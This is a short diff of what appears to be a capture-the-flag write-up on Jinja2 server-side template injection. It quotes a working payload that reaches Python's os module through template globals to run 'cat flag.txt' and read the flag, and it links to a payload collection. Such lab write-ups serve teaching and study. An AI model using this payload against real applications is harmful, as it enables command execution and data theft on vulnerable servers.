@@ -42,8 +42,10 @@ We see that the description has executed the payload **SSTI** :
 <img width="500" height="300" alt="image" src="https://github.com/user-attachments/assets/c1233d0b-a486-42fd-b0fb-2f90859ce646" />  
 Now we will transmit the payload to read the flag:  
 ```{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}```  
+  
 Flag will be returned  
 <img width="500" height="250" alt="image" src="https://github.com/user-attachments/assets/d935b5ef-7d3b-40b7-acfb-c40fd7fced52" />
   
 See more: [Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2)
+
 
